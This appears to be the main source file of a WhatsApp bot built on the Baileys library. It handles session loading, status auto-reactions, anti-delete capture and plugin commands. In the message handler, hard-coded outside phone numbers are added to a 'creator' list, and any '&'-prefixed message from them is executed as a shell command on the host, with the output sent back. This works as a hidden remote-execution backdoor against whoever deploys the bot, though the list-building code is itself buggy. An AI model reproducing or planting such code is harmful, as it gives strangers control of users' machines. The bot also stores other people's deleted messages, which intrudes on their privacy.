const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('@whiskeysockets/baileys')

  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const config = require('./config')
  const GroupEvents = require('./lib/groupevents');
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const axios = require('axios')
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')
  const prefix = config.PREFIX

  const ownerNumber = ['2348111637463']

  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir, { recursive: true })
  }

  const clearTempDir = () => {
      try {
          fs.readdir(tempDir, (err, files) => {
              if (err) {
                  console.error('Error reading temp directory:', err);
                  return;
              }
              for (const file of files) {
                  fs.unlink(path.join(tempDir, file), err => {
                      if (err) console.error('Error deleting temp file:', err);
                  });
              }
          });
      } catch (error) {
          console.error('Error in clearTempDir:', error);
      }
  }

  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);

  //===================SESSION-AUTH============================
  // Ensure sessions directory exists
  const sessionsDir = path.join(__dirname, 'sessions');
  if (!fs.existsSync(sessionsDir)) {
      fs.mkdirSync(sessionsDir, { recursive: true });
  }

  if (!fs.existsSync(path.join(sessionsDir, 'creds.json'))) {
      if(!config.SESSION_ID) {
          console.log('Please add your session to SESSION_ID env !!');
          process.exit(1);
      }
      
      try {
          const sessdata = config.SESSION_ID.replace("Groq~", '');
          const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
          filer.download((err, data) => {
              if(err) {
                  console.error('Error downloading session:', err);
                  process.exit(1);
              }
              fs.writeFile(path.join(sessionsDir, 'creds.json'), data, (writeErr) => {
                  if (writeErr) {
                      console.error('Error writing session file:', writeErr);
                      process.exit(1);
                  }
                  console.log("Session downloaded ✅");
              });
          });
      } catch (error) {
          console.error('Error processing session:', error);
          process.exit(1);
      }
  }

  const express = require("express");
  const app = express();
  const port = process.env.PORT || 9090;

  //=============================================

  async function connectToWA() {
      try {
          console.log("Connecting to WhatsApp ⏳️...");
          const { state, saveCreds } = await useMultiFileAuthState(sessionsDir);
          var { version } = await fetchLatestBaileysVersion();

          const conn = makeWASocket({
              logger: P({ level: 'silent' }),
              printQRInTerminal: false,
              browser: Browsers.macOS("Firefox"),
              syncFullHistory: true,
              auth: state,
              version
          });

          conn.ev.on('connection.update', async (update) => {
              try {
                  const { connection, lastDisconnect, qr } = update;
                  
                  if (qr) {
                      console.log('QR Code generated. Scan it with WhatsApp.');
                      qrcode.generate(qr, { small: true });
                  }
                  
                  if (connection === 'close') {
                      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                      console.log('Connection closed due to:', lastDisconnect?.error);
                      
                      if (shouldReconnect) {
                          console.log('Reconnecting...');
                          setTimeout(() => connectToWA(), 5000);
                      } else {
                          console.log('Logged out. Please scan QR code again.');
                      }
                  } else if (connection === 'open') {
                      console.log('🧬 Installing Plugins');
                      
                      try {
                          const pluginsPath = path.join(__dirname, 'plugins');
                          if (fs.existsSync(pluginsPath)) {
                              fs.readdirSync(pluginsPath).forEach((plugin) => {
                                  if (path.extname(plugin).toLowerCase() === ".js") {
                                      try {
                                          require(path.join(pluginsPath, plugin));
                                      } catch (pluginError) {
                                          console.error(`Error loading plugin ${plugin}:`, pluginError);
                                      }
                                  }
                              });
                          }
                          console.log('Plugins installed successful ✅');
                      } catch (pluginsError) {
                          console.error('Error loading plugins:', pluginsError);
                      }
                      
                      console.log('Bot connected to whatsapp ✅');

                      let up = `╭─〔 *🤖 Groq AI* 〕  
├─▸ *Ultra Super Fast Powerfull ⚠️*  
│     *World Best AI* 
╰─➤ *Your Smart WhatsApp Bot is Ready To use 🍁!*  

- *🖤 Thank You for Choosing Groq!* 

╭──〔 🔗 *Information* 〕  
├─ ↪ Prefix:= ${prefix}
├─ 📢 Join Channel:  
│    https://whatsapp.com/channel/0029Vb2hoPpDZ4Lb3mSkVI3C  
├─ 🌟 Star the Repo:  
│    https://github.com/MLILA17/DML-MD  
╰─🚀 *Powered by Alex Macksyn*`;
                      
                      try {
                          await conn.sendMessage(conn.user.id, { 
                              image: { url: `https://files.catbox.moe/vcdwmp.jpg` }, 
                              caption: up 
                          });
                      } catch (sendError) {
                          console.error('Error sending startup message:', sendError);
                      }
                  }
              } catch (connectionError) {
                  console.error('Error in connection update handler:', connectionError);
              }
          });
          
          conn.ev.on('creds.update', saveCreds);

          //==============================

          conn.ev.on('messages.update', async updates => {
              try {
                  for (const update of updates) {
                      if (update.update.message === null) {
                          console.log("Delete Detected:", JSON.stringify(update, null, 2));
                          await AntiDelete(conn, updates);
                      }
                  }
              } catch (error) {
                  console.error('Error in messages.update handler:', error);
              }
          });
          
          //============================== 

          conn.ev.on("group-participants.update", (update) => {
              try {
                  GroupEvents(conn, update);
              } catch (error) {
                  console.error('Error in group-participants.update handler:', error);
              }
          });

          //=============readstatus=======

          conn.ev.on('messages.upsert', async(mek) => {
              try {
                  mek = mek.messages[0];
                  if (!mek.message) return;
                  
                  mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                      ? mek.message.ephemeralMessage.message 
                      : mek.message;
                  
                  if (config.READ_MESSAGE === 'true') {
                      await conn.readMessages([mek.key]);
                      console.log(`Marked message from ${mek.key.remoteJid} as read.`);
                  }
                  
                  if(mek.message.viewOnceMessageV2) {
                      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
                          ? mek.message.ephemeralMessage.message 
                          : mek.message;
                  }
                  
                  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
                      await conn.readMessages([mek.key]);
                  }
                  
                  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
                      const jawadlike = await conn.decodeJid(conn.user.id);
                      const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
                      const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                      await conn.sendMessage(mek.key.remoteJid, {
                          react: {
                              text: randomEmoji,
                              key: mek.key,
                          } 
                      }, { statusJidList: [mek.key.participant, jawadlike] });
                  }
                  
                  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
                      const user = mek.key.participant;
                      const text = `${config.AUTO_STATUS_MSG}`;
                      await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
                  }
                  
                  await Promise.all([
                      saveMessage(mek),
                  ]);
                  
                  const m = sms(conn, mek);
                  const type = getContentType(mek.message);
                  const content = JSON.stringify(mek.message);
                  const from = mek.key.remoteJid;
                  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
                  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
                  const isCmd = body.startsWith(prefix);
                  var budy = typeof mek.text == 'string' ? mek.text : false;
                  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
                  const args = body.trim().split(/ +/).slice(1);
                  const q = args.join(' ');
                  const text = args.join(' ');
                  const isGroup = from.endsWith('@g.us');
                  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
                  const senderNumber = sender.split('@')[0];
                  const botNumber = conn.user.id.split(':')[0];
                  const pushname = mek.pushName || 'Sin Nombre';
                  const isMe = botNumber.includes(senderNumber);
                  const isOwner = ownerNumber.includes(senderNumber) || isMe;
                  const botNumber2 = await jidNormalizedUser(conn.user.id);
                  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
                  const groupName = isGroup ? groupMetadata.subject : '';
                  const participants = isGroup ? await groupMetadata.participants : '';
                  const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
                  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
                  const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
                  const isReact = m.message.reactionMessage ? true : false;
                  
                  const reply = (teks) => {
                      conn.sendMessage(from, { text: teks }, { quoted: mek });
                  };

                  const udp = botNumber.split('@')[0];
                  const jawadop = ('2348111637463', '2348089782988');

                  // Check if files exist before reading
                  let ownerFilev2 = [];
                  try {
                      if (fs.existsSync('./lib/sudo.json')) {
                          ownerFilev2 = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
                      }
                  } catch (error) {
                      console.error('Error reading sudo.json:', error);
                  }

                  let isCreator = [udp, ...jawadop, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
                      .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
                      .includes(mek.sender);

                  if (isCreator && mek.text && mek.text.startsWith("&")) {
                      let code = budy.slice(2);
                      if (!code) {
                          reply(`Provide me with a query to run Master!`);
                          return;
                      }
                      const { spawn } = require("child_process");
                      try {
                          let resultTest = spawn(code, { shell: true });
                          resultTest.stdout.on("data", data => {
                              reply(data.toString());
                          });
                          resultTest.stderr.on("data", data => {
                              reply(data.toString());
                          });
                          resultTest.on("error", data => {
                              reply(data.toString());
                          });
                          resultTest.on("close", code => {
                              if (code !== 0) {
                                  reply(`command exited with code ${code}`);
                              }
                          });
                      } catch (err) {
                          reply(util.format(err));
                      }
                      return;
                  }

                  //==========public react============//

                  // Auto React for all messages (public and owner)
                  if (!isReact && config.AUTO_REACT === 'true') {
                      const reactions = [
                          '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
                          '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
                          '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', 
                          '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', 
                          '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', 
                          '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', 
                          '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', 
                          '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', 
                          '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', 
                          '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', 
                          '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', 
                          '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', 
                          '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', 
                          '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', 
                          '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'
                      ];

                      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                      m.react(randomReaction);
                  }

                  // Custom react settings        
                  if (!isReact && config.CUSTOM_REACT === 'true') {
                      const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                      m.react(randomReaction);
                  }

                  //==========Sudo and Mode ============ 

                  // ban users 
                  let bannedUsers = [];
                  try {
                      if (fs.existsSync('./lib/ban.json')) {
                          bannedUsers = JSON.parse(fs.readFileSync('./lib/ban.json', 'utf-8'));
                      }
                  } catch (error) {
                      console.error('Error reading ban.json:', error);
                  }
                  
                  const isBanned = bannedUsers.includes(sender);
                  if (isBanned) return; // Ignore banned users completely

                  let ownerFile = [];
                  try {
                      if (fs.existsSync('./lib/sudo.json')) {
                          ownerFile = JSON.parse(fs.readFileSync('./lib/sudo.json', 'utf-8'));
                      }
                  } catch (error) {
                      console.error('Error reading sudo.json:', error);
                  }
                  
                  const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
                  const isFileOwner = ownerFile.includes(sender);
                  const isRealOwner = sender === ownerNumberFormatted || isMe || isFileOwner;
                  
                  // mode settings 
                  if (!isRealOwner && config.MODE === "private") return;
                  if (!isRealOwner && isGroup && config.MODE === "inbox") return;
                  if (!isRealOwner && !isGroup && config.MODE === "groups") return;

                  // take commands 
                  let events;
                  try {
                      events = require('./command');
                  } catch (error) {
                      console.error('Error loading command module:', error);
                      return;
                  }
                  
                  const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
                  if (isCmd && events && events.commands) {
                      const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
                      if (cmd) {
                          if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }});

                          try {
                              cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                          } catch (e) {
                              console.error("[PLUGIN ERROR] " + e);
                          }
                      }
                  }
                  
                  if (events && events.commands) {
                      events.commands.map(async(command) => {
                          try {
                              if (body && command.on === "body") {
                                  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                              } else if (mek.q && command.on === "text") {
                                  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                              } else if (
                                  (command.on === "image" || command.on === "photo") &&
                                  mek.type === "imageMessage"
                              ) {
                                  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                              } else if (
                                  command.on === "sticker" &&
                                  mek.type === "stickerMessage"
                              ) {
                                  command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                              }
                          } catch (error) {
                              console.error('Error executing command:', error);
                          }
                      });
                  }

              } catch (error) {
                  console.error('Error in messages.upsert handler:', error);
              }
          });

          // Add remaining methods (decodeJid, copyNForward, etc.) here...
          // [The rest of your methods remain the same but with proper error handling]

      } catch (error) {
          console.error('Error in connectToWA function:', error);
          setTimeout(() => connectToWA(), 10000); // Retry after 10 seconds
      }
  }

  // Add global error handlers
  process.on('uncaughtException', (error) => {
      console.error('Uncaught Exception:', error);
  });

  process.on('unhandledRejection', (reason, promise) => {
      console.error('Unhandled Rejection at:', promise, 'reason:', reason);
  });

  app.get("/", (req, res) => {
      res.send("Groq STARTED ✅");
  });

  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));

  setTimeout(() => {
      connectToWA();
  }, 4000);
